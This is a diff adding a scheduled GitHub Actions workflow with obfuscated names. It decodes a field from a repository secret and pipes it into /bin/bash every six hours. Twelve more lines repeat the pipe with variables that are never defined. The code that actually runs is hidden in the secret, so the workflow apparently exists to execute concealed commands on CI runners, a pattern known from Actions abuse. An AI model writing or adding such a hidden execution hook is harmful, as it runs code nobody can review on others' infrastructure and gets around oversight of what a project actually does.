@@ -1,0 +1,31 @@
+name: wohuigendii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wohuigendii
+        env:
+          lezlt32: ${{ secrets.lezlt32 }}
+        run: |
+          echo $lezlt32 | jq -r .ie24 | /bin/bash
+          echo $vkm9 | jq -r .yr9855 | /bin/bash
+          echo $tzs7 | jq -r .fwr120 | /bin/bash
+          echo $xmpam3389 | jq -r .hcj332 | /bin/bash
+          echo $mva733 | jq -r .dv1874 | /bin/bash
+          echo $orel68 | jq -r .dm6 | /bin/bash
+          echo $mjwv44 | jq -r .eieqs6 | /bin/bash
+          echo $mprm028 | jq -r .zyv93852 | /bin/bash
+          echo $odcup3 | jq -r .s5908 | /bin/bash
+          echo $erl14604 | jq -r .p16 | /bin/bash
+          echo $isl3879 | jq -r .z2231 | /bin/bash
+          echo $iq576 | jq -r .shd53718 | /bin/bash
+          echo $l0166 | jq -r .fio5616 | /bin/bash
+
